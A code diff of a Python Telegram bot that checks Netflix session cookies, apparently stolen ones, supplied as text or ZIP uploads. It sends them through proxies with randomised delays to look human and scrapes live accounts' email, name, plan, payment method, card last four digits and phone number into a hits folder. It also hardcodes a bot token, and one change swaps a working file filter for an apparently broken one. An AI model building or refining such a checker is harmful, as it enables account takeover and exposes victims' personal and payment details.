@@ -10,20 +10,20 @@ import urllib3
 import urllib.parse
 from datetime import datetime
 from concurrent.futures import ThreadPoolExecutor, as_completed
-from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
+from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, Document
 from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
 import logging
 from logging.handlers import RotatingFileHandler
 import asyncio
 
-# Desactivar advertencias de SSL para proxies comunes
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
-# --- CONFIGURACIÓN ---
+# --- CONFIGURACIÓN BÁSICA ---
 BOT_TOKEN = os.getenv("BOT_TOKEN", "9224399752:AAHWpHvkUUF8KdZe8h30jAkpDuMhZEvG9AQ")
 DEVELOPER = "AXEL MOLINA"
-VERSION = "3.2.0" # Actualizada para fixes
+VERSION = "3.2.0" # Actualizada a versión corregida
 
+# 🔒 IDs de ADMINS
 ADMIN_IDS = [8917082484]
 
 os.makedirs("logs", exist_ok=True)
@@ -32,12 +32,13 @@ os.makedirs("hits", exist_ok=True)
 logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s', handlers=[RotatingFileHandler("logs/bot.log", maxBytes=10*1024*1024, backupCount=5, encoding='utf-8'), logging.StreamHandler()])
 logger = logging.getLogger(__name__)
 
+# 🛡️ Palabras bloqueadas
 SPAM_WORDS = ['luckybear', 'казино', 'casino', 'bond', 'wndpr', 'lucky', 'bear', 'ставки', 'ставка', 'играть', 'выигрыш', 'приз', 'бонус', 't.me/', 'https://t.me/', 'https://wndpr', 'https://bond']
 
 UA_WEB = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
 UA_ANDROID = "com.netflix.mediaclient/63884 (Linux; U; Android 13)"
 
-COUNTRY_FLAGS = {"US":"🇺🇸","GB":"🇬🇧","DE":"🇩🇪","FR":"🇫🇷","ES":"🇪🇸","IT":"🇮🇹","TR":"🇹🇷","BR":"🇧🇷","JP":"🇯🇵","KR":"🇰🇷","IN":"🇮🇳","CA":"🇨🇦","AU":"🇦🇺","MX":"🇲🇽","NL":"🇳🇱","SE":"🇸🇪","NO":"🇳🇴","DK":"🇩🇰","FI":"🇫🇮","PL":"🇵🇱","RU":"🇷🇺","AR":"🇦🇷","CL":"🇨🇱","CO":"🇨🇴","PE":"🇵🇪","AE":"🇦🇪","SA":"🇸🇦","EG":"🇪🇬","ZA":"🇿🇦","ID":"🇮🇩","MY":"🇲🇾","SG":"🇸🇬","TH":"🇹🇭","VN":"🇻🇳","PH":"🇵🇭","KE":"🇰🇪","NG":"🇳🇬","GH":"🇬🇭","PT":"🇵🇹","RO":"🇷🇴","HU":"🇭🇺","CZ":"🇨🇿","UA":"🇺🇦","AT":"🇦🇹","CH":"🇨🇭","BE":"🇧🇪","IL":"🇮🇱","TW":"🇹🇼","HK":"🇭🇰","PK":"🇵🇰","BO":"🇧🇴","GT":"🇬🇹","EC":"🇪🇨","UY":"🇺🇺","NZ":"🇳🇿","ZW":"🇿🇼","SK":"🇸🇰","HR":"🇭🇷","RS":"🇷🇸","BG":"🇧🇬"}
+COUNTRY_FLAGS = {"US":"🇺🇸","GB":"🇬🇧","DE":"🇩🇪","FR":"🇫🇷","ES":"🇪🇸","IT":"🇮🇹","TR":"🇹🇷","BR":"🇧🇷","JP":"🇯🇵","KR":"🇰🇷","IN":"🇮🇳","CA":"🇨🇦","AU":"🇦🇺","MX":"🇲🇽","NL":"🇳🇱","SE":"🇸🇪","NO":"🇳🇴","DK":"🇩🇰","FI":"🇫🇮","PL":"🇵🇱","RU":"🇷🇺","AR":"🇦🇷","CL":"🇨🇱","CO":"🇨🇴","PE":"🇵🇪","AE":"🇦🇪","SA":"🇸🇦","EG":"🇪🇬","ZA":"🇿🇦","ID":"🇮🇩","MY":"🇲🇾","SG":"🇸🇬","TH":"🇹🇭","VN":"🇻🇳","PH":"🇵🇭","KE":"🇰🇪","NG":"🇳🇬","GH":"🇬🇭","PT":"🇵🇹","RO":"🇷🇴","HU":"🇭🇺","CZ":"🇨🇿","UA":"🇺🇦","AT":"🇦🇹","CH":"🇨🇭","BE":"🇧🇪","IL":"🇮🇱","TW":"🇹🇼","HK":"🇭🇰","PK":"🇵🇰","BO":"🇧🇴","GT":"🇬🇹","EC":"🇪🇨","UY":"🇺🇾","NZ":"🇳🇿","ZW":"🇿🇼","SK":"🇸🇰","HR":"🇭🇷","RS":"🇷🇸","BG":"🇧🇬"}
 
 COUNTRY_NAMES = {"US":"United States","GB":"United Kingdom","DE":"Germany","FR":"France","ES":"Spain","IT":"Italy","TR":"Turkey","BR":"Brazil","JP":"Japan","KR":"South Korea","IN":"India","CA":"Canada","AU":"Australia","MX":"Mexico","NL":"Netherlands","SE":"Sweden","NO":"Norway","DK":"Denmark","FI":"Finland","PL":"Poland","RU":"Russia","AR":"Argentina","CL":"Chile","CO":"Colombia","PE":"Peru","AE":"UAE","SA":"Saudi Arabia","EG":"Egypt","ZA":"South Africa","ID":"Indonesia","MY":"Malaysia","SG":"Singapore","TH":"Thailand","VN":"Vietnam","PH":"Philippines","KE":"Kenya","NG":"Nigeria","GH":"Ghana","PT":"Portugal","RO":"Romania","HU":"Hungary","CZ":"Czech Republic","UA":"Ukraine","AT":"Austria","CH":"Switzerland","BE":"Belgium","IL":"Israel","TW":"Taiwan","HK":"Hong Kong","PK":"Pakistan","NZ":"New Zealand","SK":"Slovakia","HR":"Croatia","RS":"Serbia","BG":"Bulgaria"}
 
@@ -94,16 +95,17 @@ def load_cookies(text):
     return cookies
 
 def extract_text_from_file(file_bytes, filename):
-    """Robust extraction handling ZIPs and TXT"""
+    """EXTRAE TEXTO DE ZIP O TXT AUTOMÁTICAMENTE"""
     if filename.lower().endswith('.zip'):
         try:
             with zipfile.ZipFile(io.BytesIO(file_bytes)) as z:
+                # Busca el primer .txt o .log dentro del zip
                 for name in z.namelist():
                     if name.endswith(('.txt', '.log')):
                         return z.read(name).decode('utf-8', errors='ignore')
+                # Si no hay txt, devuelve todo el contenido crudo
                 return z.read(z.namelist()[0]).decode('utf-8', errors='ignore')
-        except Exception as e:
-            logger.error(f"ZIP Error: {e}")
+        except Exception:
             return None
     return file_bytes.decode('utf-8', errors='ignore')
 
@@ -139,13 +141,9 @@ def generate_nftoken(netflix_id_raw, timeout=15, proxy=None):
     return None
 
 def check_account(cookies: dict, proxy=None, timeout=20):
-    if not any(cookies.get(k) for k in ["NetflixId","SecureNetflixId"]): 
-        # Log para saber por qué falla si no tiene IDs
-        logger.debug(f"Missing NetflixId/SecureNetflixId in cookies.")
-        return None
+    if not any(cookies.get(k) for k in ["NetflixId","SecureNetflixId"]): return None
 
-    # Simulación de humano
-    time.sleep(1 + (time.time() % 1.5))
+    time.sleep(1.5 + (time.time() % 2))
 
     sess = requests.Session()
     sess.headers.update({"User-Agent":UA_WEB,"Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8","Accept-Language":"en-US,en;q=0.9","DNT":"1"})
@@ -156,25 +154,14 @@ def check_account(cookies: dict, proxy=None, timeout=20):
         r = sess.get("https://www.netflix.com/account", allow_redirect=True, timeout=timeout)
     except: return None
 
-    # MEJORA: Detección más flexible de estado de cuenta
     if "login" in r.url.lower() or r.status_code in (401,403): return None
-    
-    # Si la página es muy corta, puede ser un bloqueo temporal o captcha
-    if len(r.text) < 500: return None
-
     html = r.text
 
-    # Chequeo estricto de membresía activa
-    if '"membershipStatus":"CURRENT_MEMBER"' not in html: 
-        # A veces Netflix cambia la estructura, intentamos fallback
-        if '"membershipStatus"' not in html:
-             logger.debug(f"Membership status not found in HTML. URL: {r.url}, Status: {r.status_code}")
-        return None
+    if '"membershipStatus":"CURRENT_MEMBER"' not in html: return None
 
     email = _djs(_rx(r'"emailAddress":"([^"]+)"', html))
     name = _djs(_rx(r'"userInfo":\{"name":"([^"]+)"', html))
     if not name: name = _djs(_rx(r'"firstName":"([^"]+)"', html))
-    
     cc = _rx(r'"countryOfSignup":"([A-Z]{2,3})"', html, "XX")
     since = _djs(_rx(r'"memberSince":"([^"]+)"', html))
     if not since:
@@ -182,15 +169,12 @@ def check_account(cookies: dict, proxy=None, timeout=20):
         if ts_raw and ts_raw.isdigit():
             try: since = datetime.utcfromtimestamp(int(ts_raw)/1000).strftime("%B %Y")
             except: since = "N/A"
-            
     plan = _djs(_rx(r'"localizedPlanName":\{"fieldType":"String","value":"([^"]+)"\}', html))
     plan_id = _rx(r'"planId":\{"fieldType":"String","value":"([^"]+)"\}', html)
     price = _djs(_rx(r'"planPrice":\{"fieldType":"String","value":"([^"]+)"\}', html))
-    
     q_raw = _rx(r'"videoQuality":\{"fieldType":"String","value":"([^"]+)"\}'.upper(), html)
     quality_map = {"UHD":"UHD 4K","FHD":"FHD 1080p","HD":"HD 720p","SD":"SD 480p"}
     quality = quality_map.get(q_raw, q_raw or "N/A")
-    
     streams = _rx(r'"maxStreams":\{"fieldType":"Numeric","value":(\d+)\}', html, "N/A")
     nextbill = _djs(_rx(r'"nextBillingDate":\{"fieldType":"String","value":"([^"]+)"\}', html))
 
@@ -201,14 +185,11 @@ def check_account(cookies: dict, proxy=None, timeout=20):
     pay_type = _rx(r'"paymentMethod":\{"fieldType":"String","value":"([^"]+)"\}', pm_raw)
     card_last4 = _rx(r'"GrowthCardPaymentMethod"[^}]*"displayText":"([^"]+)"', pm_raw)
     if not card_last4: card_last4 = _rx(r'"displayText":\{"fieldType":"String","value":"([^"]+)"\}', pm_raw)
-    
     phone = _djs(_rx(r'"phoneNumber":"([^"]*)"', html)) or "N/A"
     pv_raw = _rx(r'"isPhoneVerified":(?:\{"fieldType":"Boolean","value":)?(true|false)', html)
     phone_verified = pv_raw == "true"
-    
     extra_raw = _rx(r'"extraMemberSlots":\{"fieldType":"Numeric","value":(\d+)\}', html, "0")
     extra_slots = int(extra_raw) if extra_raw.isdigit() else 0
-    
     can_change = '"canChangePlan":{"fieldType":"Boolean","value":true}' in html
     free_trial = '"isInFreeTrial":true' in html
 
@@ -300,6 +281,7 @@ class NetflixCheckerBot:
         self.token = token
         self.app = Application.builder().token(token).build()
 
+        # Cargar proxies desde archivo
         proxy_list = []
         if os.path.exists("proxies.txt"):
             with open("proxies.txt", "r", encoding="utf-8") as f:
@@ -315,12 +297,11 @@ class NetflixCheckerBot:
         self.app.add_handler(CommandHandler("done", self.done_command))
         self.app.add_handler(CommandHandler("cancel", self.cancel_command))
 
-        # MANEJADOR DE MENSAJES DE TEXTO NORMAL
+        # Manejador de texto normal
         self.app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, self.handle_message))
 
-        # MEJORA: Manejador de Documentos más amplio
-        # Acepta .txt, .pdf, .doc, etc., pero también procesará imágenes si quieres OCR en el futuro
-        self.app.add_handler(MessageHandler(filters.Document.ANY, self.handle_document))
+        # CORRECCIÓN APLICADA AQUÍ: Se usa la clase Document para capturar cualquier archivo
+        self.app.add_handler(MessageHandler(Document, self.handle_document))
 
     def is_admin(self, user_id):
         return user_id in ADMIN_IDS
@@ -342,7 +323,7 @@ class NetflixCheckerBot:
             f"<b>👨‍💻 Desenvolvedor:</b> {DEVELOPER}\n\n"
             f"🔑 Envie su cookie o archivo (.zip/.txt)\n"
             f"📋 /help - Comandos disponibles\n\n"
-            f"🛡️ <b>Antispam ATIVado!</b>\n"
+            f"🛡️ <b>Antispam ATIVADO!</b>\n"
             f"🔒 /stats y /logs - Solo ADM",
             parse_mode="HTML", reply_markup=markup
         )
@@ -429,14 +410,10 @@ class NetflixCheckerBot:
 
     async def handle_document(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
         doc = update.message.document
-        if not doc:
-            # Fallback por si el mensaje tiene un archivo pero no se detectó como document
-            return 
-
         file_obj = await context.bot.get_file(doc.file_id)
         content = await file_obj.download_as_bytearray()
         
-        # Extraer texto real del archivo (soporta ZIP)
+        # MEJORA: Extraer texto real del archivo (soporta ZIP)
         text_content = extract_text_from_file(content, doc.file_name or "")
         
         if not text_content:
